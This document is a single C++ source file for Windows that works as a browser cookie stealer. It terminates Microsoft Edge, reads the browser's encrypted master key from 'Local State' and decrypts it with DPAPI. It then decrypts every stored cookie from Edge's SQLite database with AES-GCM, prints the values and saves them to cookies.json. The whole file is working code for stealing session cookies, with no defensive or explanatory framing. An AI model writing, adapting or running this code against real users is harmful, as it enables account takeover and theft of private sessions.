#include <iostream>
#include <Windows.h>
#include <wincrypt.h>
#include <vector>
#include <string>
#include <shlobj.h>
#include <io.h>
#include <fstream>
#include "sqlite3.h"
#include <tlhelp32.h>

#include "json.hpp"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")

using json = nlohmann::json;

#define AES_BLOCK_SIZE 16
#define AES_KEY_SIZE 32
#define GCM_TAG_SIZE 16
#define GCM_NONCE_SIZE 12

struct Cookie {
    std::string name;
    std::string value;
    std::string domain;
    std::string path;
    std::string creation_utc;
    std::string expiry_utc;
};


bool KillProcessByName(const char* processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot!" << std::endl;
        return false;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        std::cerr << "Failed to retrieve process information!" << std::endl;
        CloseHandle(hProcessSnap);
        return false;
    }

    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                if (TerminateProcess(hProcess, 0)) {
                    std::cout << "Process " << processName << " terminated successfully." << std::endl;
                    CloseHandle(hProcess);
                    CloseHandle(hProcessSnap);
                    return true;
                }
                CloseHandle(hProcess);
            } else {
                std::cerr << "Failed to open process for termination!" << std::endl;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    std::cerr << "Process " << processName << " not found!" << std::endl;
    CloseHandle(hProcessSnap);
    return false;
}

std::string getUserProfilePath() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path))) {
        return std::string(path);
    }
    return "";
}

std::string getEdgeBrowserCookiePath() {
    std::string profilePath = getUserProfilePath();
    return profilePath + R"(\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies)";
}

std::string getLocalStatePath() {
    std::string profilePath = getUserProfilePath();
    return profilePath + R"(\AppData\Local\Microsoft\Edge\User Data\Local State)";
}

std::string getEncryptedAESKey() {
    std::string localStatePath = getLocalStatePath();
    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        std::cerr << "Unable to open Local State file." << std::endl;
        return "";
    }

    json j;
    file >> j;
    file.close();

    std::string encryptedKeyBase64 = j["os_crypt"]["encrypted_key"];
    return encryptedKeyBase64;
}

std::vector<unsigned char> base64Decode(const std::string &base64) {
    DWORD decodedLength = 0;
    CryptStringToBinaryA(base64.c_str(), base64.length(), CRYPT_STRING_BASE64, nullptr, &decodedLength, nullptr, nullptr);

    std::vector<unsigned char> decodedData(decodedLength);
    if (!CryptStringToBinaryA(base64.c_str(), base64.length(), CRYPT_STRING_BASE64, decodedData.data(), &decodedLength, nullptr, nullptr)) {
        std::cerr << "Base64 decoding failed." << std::endl;
        return {};
    }

    return decodedData;
}

std::vector<unsigned char> decryptAESKey(const std::vector<unsigned char>& encryptedKey) {
    DATA_BLOB in;
    in.pbData = const_cast<BYTE *>(encryptedKey.data() + 5);  // Skip the DPAPI prefix (first 5 bytes)
    in.cbData = static_cast<DWORD>(encryptedKey.size() - 5);

    DATA_BLOB out;
    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
        std::vector<unsigned char> decryptedKey(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return decryptedKey;
    }

    std::cerr << "AES key decryption failed." << std::endl;
    return {};
}

// AES decryption
std::string decryptWithAESGCM(const std::vector<unsigned char>& encrypted_data, const std::vector<unsigned char>& key) {
    if (encrypted_data.size() < GCM_NONCE_SIZE + GCM_TAG_SIZE) {
        std::cerr << "Invalid encrypted data size." << std::endl;
        return "";
    }

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "BCryptOpenAlgorithmProvider failed." << std::endl;
        return "";
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "BCryptSetProperty failed." << std::endl;
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    DWORD keyObjectSize = 0, result = 0;
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(keyObjectSize), &result, 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "BCryptGetProperty failed." << std::endl;
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    std::vector<unsigned char> keyObject(keyObjectSize);
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectSize, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "BCryptGenerateSymmetricKey failed." << std::endl;
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    std::vector<unsigned char> nonce(encrypted_data.begin(), encrypted_data.begin() + GCM_NONCE_SIZE);
    std::vector<unsigned char> ciphertext(encrypted_data.begin() + GCM_NONCE_SIZE, encrypted_data.end() - GCM_TAG_SIZE);
    std::vector<unsigned char> tag(encrypted_data.end() - GCM_TAG_SIZE, encrypted_data.end());

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce.data();
    authInfo.cbNonce = (ULONG)nonce.size();
    authInfo.pbTag = tag.data();
    authInfo.cbTag = (ULONG)tag.size();

    // Decrypt
    std::vector<unsigned char> plaintext(ciphertext.size());
    status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, nullptr, 0, plaintext.data(), (ULONG)plaintext.size(), &result, 0);
    if (!BCRYPT_SUCCESS(status)) {
        std::cerr << "BCryptDecrypt failed." << std::endl;
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    // Cleanup
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string(plaintext.begin(), plaintext.end());
}

// Decrypt the cookie using Windows DPAPI
std::string decryptWithDPAPI(const std::vector<unsigned char>& encrypted_data) {
    if (encrypted_data.empty()) {
        return "";
    }

    DATA_BLOB in;
    in.pbData = const_cast<BYTE *>(encrypted_data.data());
    in.cbData = static_cast<DWORD>(encrypted_data.size());

    DATA_BLOB out;

    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
        std::string decrypted_value(reinterpret_cast<char*>(out.pbData), out.cbData);
        LocalFree(out.pbData);
        return decrypted_value;
    }

    return "";
}


std::string decryptData(const std::vector<unsigned char>& encrypted_data, const std::vector<unsigned char>& aes_key) {
    if (encrypted_data.size() > 3 && encrypted_data[0] == 'v' && encrypted_data[1] == '1' && encrypted_data[2] == '0') {
        std::vector<unsigned char> encrypted_content(encrypted_data.begin() + 3, encrypted_data.end());
        return decryptWithAESGCM(encrypted_content, aes_key);
    }

    return decryptWithDPAPI(encrypted_data);
}

void writeCookiesToJson(const std::vector<Cookie>& cookies, const std::string& output_file) {
    nlohmann::json json_data;

    for (const auto& cookie : cookies) {
        json_data.push_back({
            {"name", cookie.name},
            {"value", cookie.value},
            {"domain", cookie.domain},
            {"path", cookie.path},
            {"creation_utc", cookie.creation_utc},
            {"expiry_utc", cookie.expiry_utc}
        });
    }

    std::ofstream file(output_file);
    if (!file.is_open()) {
        std::cerr << "Failed to open file for writing: " << output_file << std::endl;
        return;
    }

    file << json_data.dump(4);
    file.close();
}

void readAndDecryptCookies(const std::string& db_path, const std::vector<unsigned char>& aes_key) {
    sqlite3* db;
    if (sqlite3_open(db_path.c_str(), &db) != SQLITE_OK) {
        std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
        return;
    }

    const char* sql = "SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc FROM cookies";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        std::cerr << "Failed to prepare SQL statement: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return;
    }

    std::vector<Cookie> cookies;

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));

        const void* encrypted_value_void = sqlite3_column_blob(stmt, 1);
        const unsigned char* encrypted_value = reinterpret_cast<const unsigned char*>(encrypted_value_void);
        int encrypted_size = sqlite3_column_bytes(stmt, 1);

        std::string domain = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
        std::string path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
        std::string creation_utc = std::to_string(sqlite3_column_int64(stmt, 4));
        std::string expiry_utc = std::to_string(sqlite3_column_int64(stmt, 5));

        if (encrypted_value == nullptr || encrypted_size == 0) {
            std::cerr << "Error: Encrypted value is null or empty for cookie: " << name << std::endl;
            continue;
        }

        std::vector<unsigned char> encrypted_data(encrypted_value, encrypted_value + encrypted_size);
        std::string decrypted_value = decryptData(encrypted_data, aes_key);
        if (decrypted_value.empty()) {
            std::cerr << "Error: Decryption failed for cookie: " << name << std::endl;
            continue;
        }

        Cookie cookie = { name, decrypted_value, domain, path, creation_utc, expiry_utc };
        std::cout << "Cookie Name: " << cookie.name << std::endl;
        std::cout << "Cookie Value: " << cookie.value << std::endl;
        std::cout << "Domain: " << cookie.domain << std::endl;
        std::cout << "Path: " << cookie.path << std::endl;
        std::cout << "Creation UTC: " << cookie.creation_utc << std::endl;
        std::cout << "Expiry UTC: " << cookie.expiry_utc << std::endl;
        std::cout << "-----------------------------" << std::endl;
        cookies.push_back(cookie);
    }
    writeCookiesToJson(cookies, "cookies.json");
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

int main() {
    KillProcessByName("msedge.exe");

    std::string encrypted_key_base64 = getEncryptedAESKey();
    if (encrypted_key_base64.empty()) {
        std::cerr << "Failed to retrieve encrypted AES key." << std::endl;
        return 1;
    }

    std::vector<unsigned char> encrypted_key = base64Decode(encrypted_key_base64);

    std::vector<unsigned char> aes_key = decryptAESKey(encrypted_key);
    if (aes_key.empty()) {
        std::cerr << "Failed to decrypt AES key." << std::endl;
        return 1;
    }

    std::string db_path = getEdgeBrowserCookiePath();
    if (db_path.empty()) {
        std::cerr << "Can't find the Edge browser's cookie path." << std::endl;
        return 1;
    }

    readAndDecryptCookies(db_path, aes_key);

    return 0;
}
